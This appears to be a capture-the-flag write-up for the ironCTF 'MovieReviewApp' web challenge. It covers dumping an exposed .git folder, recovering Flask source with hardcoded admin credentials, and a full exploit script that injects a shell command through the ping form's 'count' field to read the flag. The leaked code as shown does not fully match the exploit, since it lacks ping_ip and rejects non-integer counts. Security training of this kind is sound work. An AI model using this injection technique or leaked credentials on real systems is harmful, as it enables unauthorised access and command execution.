+++
title = 'MovieReviewApp'
tags = [
  "Web",
  "Python",
  "Information leak",
  "483 points",
  "53 solves",
  "Vigneswar",
]
date = 2024-10-07T22:50:14+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>MovieReviewApp</h1>

**Description**: Last web challenge done in the ctf (unfortunately) also one of the fastest to do if you know the right tools

## Introduction

The challenge looks like a very simple site in pure html where we see reviews on movies

## Source

Is not present the source BUT...

## Solution

The first thing that stands out is that in the URL there are extensions, so we understand that probably the system behind it is not very complex, in fact, going to the root endpoint we notice

![alt text](/images/moviereviewapp/image.png)

That directory listing is active and a .git folder exists

This allows us to see all the committed versions of the application

But I don't recommend to manually dump the whole folder so we rely on a very useful tool found on github [GitTools](https://github.com/internetwache/GitTools)

Using the dump script, we can dump the entire .git folder and then use the extractor tool to restore all the versions.

What we get is the source with all its versions.

### Leaked source

```python
# filename: app.py

from flask import Flask, render_template, request, redirect, url_for, flash, session
import psutil
import os
import platform
import subprocess
import re

app = Flask(__name__)
app.secret_key = os.urandom(32)

ADMIN_USERNAME = 'superadmin'
ADMIN_PASSWORD = 'Sup3rS3cR3TAdminP@ssw0rd$!'

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin_panel'))
        else:
            flash("Invalid credentials. Please try again.")

    return render_template('login.html')

@app.route('/admin_panel', methods=['GET', 'POST'])
def admin_panel():
    if 'logged_in' not in session:
        return redirect(url_for('admin'))
    ping_result = None
    if request.method == 'POST':
        ip = request.form.get('ip')
        count = request.form.get('count', 1)
        try:
            count = int(count)
            ping_result = ping_ip(ip, count)
        except ValueError:
            flash("Count must be a valid integer")
        except Exception as e:
            flash(f"An error occurred: {e}")

    memory_info = psutil.virtual_memory()
    memory_usage = memory_info.percent
    total_memory = memory_info.total / (1024 ** 2)
    available_memory = memory_info.available / (1024 ** 2)

    return render_template('admin.html', ping_result=ping_result,
                           memory_usage=memory_usage, total_memory=total_memory,
                           available_memory=available_memory)


if __name__ == '__main__':
    app.run(debug=True)

```

We can see two interesting things: the first that stands out is that the admin's credentials are in the clear, and another is that we have another RCE to run.

### Exploit

```python
# filename: exploit.py

#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

BASE_URL = "https://movie-review.1nf1n1ty.team"
URL_HOOK = ""

ADMIN_USERNAME = 'superadmin'
ADMIN_PASSWORD = 'Sup3rS3cR3TAdminP@ssw0rd$!'

s = requests.Session()

def login():
  r = s.post(BASE_URL + "/servermonitor/admin",data={"username":ADMIN_USERNAME,"password":ADMIN_PASSWORD})
  if r.status_code == 200:
    print("[+] Login Success")
  else:
    print("[!] Login Failed")
    exit(1)

def exploit():
  flag = BeautifulSoup(s.post(BASE_URL + "/servermonitor/admin_panel",data={"ip":"8.8.8.8","count":"1;cat '/flag.txt' #"}).text, 'html.parser').find_all('pre')[0].text
  print("[+] Flag: ",flag)

def main():
  login()
  exploit()


if __name__ == "__main__":
  main()

# goodluck by @akiidjk
```

The solution is very simple, let's log in to the admin panel and then take advantage of the fact that the count parameter is not sanitized to execute a command of our choice and set the flag

```stdout
$ flag: ironCTF{4lways_b3_c4ar3ful_w1th_G1t!}
```

<p align='right'>Author: akiidjk </p>
